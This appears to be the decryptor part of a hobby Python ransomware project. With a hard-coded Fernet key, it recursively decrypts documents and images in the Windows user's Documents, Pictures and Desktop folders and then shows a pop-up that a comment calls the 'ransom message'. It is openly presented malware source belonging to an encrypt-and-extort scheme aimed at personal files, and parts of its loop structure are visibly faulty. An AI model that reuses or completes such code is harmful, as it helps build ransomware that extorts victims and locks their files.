#!/usr/bin/python3.8
import tkinter, getpass, glob
from tkinter import messagebox
from cryptography.fernet import Fernet


def decrypt():
    # Decrypt the already encrypted files
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="

    if True:
        usr = getpass.getuser()
        path = 'C:/Users/' + usr + '/Documents'
        for f_name in glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.docx', recursive=True) \
                      + glob.glob(path + '/**/*.ppt', recursive=True) \
                      + glob.glob(path + '/**/*.xlsx', recursive=True):
            # Start decryption
            k = key
            f = Fernet(k)

            with open(f_name, "rb") as file:
                encrypted_data = file.read()

            decrypted_data = f.decrypt(encrypted_data)
            with open(f_name, "wb") as file:
                file.write(decrypted_data)

            # Get pictures to decrypt
            path = 'C:/Users/' + usr + '/Pictures'
        for f_name in glob.glob(path + '/**/*.jpg', recursive=True) \
                      + glob.glob(path + '/**/*.jpeg', recursive=True) \
                      + glob.glob(path + '/**/*.png', recursive=True) \
                      + glob.glob(path + '/**/*.svg', recursive=True):
            # Start decryption
            k = key
            f = Fernet(k)

            with open(f_name, "rb") as file:
                encrypted_data = file.read()

            decrypted_data = f.decrypt(encrypted_data)
            with open(f_name, "wb") as file:
                file.write(decrypted_data)

        path = 'C:/Users/' + usr + '/Desktop'
        for f_name in glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.docx', recursive=True) \
                      + glob.glob(path + '/**/*.ppt', recursive=True) \
                      + glob.glob(path + '/**/*.xlsx', recursive=True):
            # Start decryption
            k = key
            f = Fernet(k)

            with open(f_name, "rb") as file:
                encrypted_data = file.read()

            decrypted_data = f.decrypt(encrypted_data)
            with open(f_name, "wb") as file:
                file.write(decrypted_data)

            # this function prompts a window containing the ransom message
            window = tkinter.Tk()
            window.wm_withdraw()
            header = "HELLO... YOUR FILES HAVE BEEN DECRYPTED"
            body = "THANK YOU"
            messagebox.showinfo(title=header, message=body)


def main():
    decrypt()


if __name__ == '__main__':
    main()
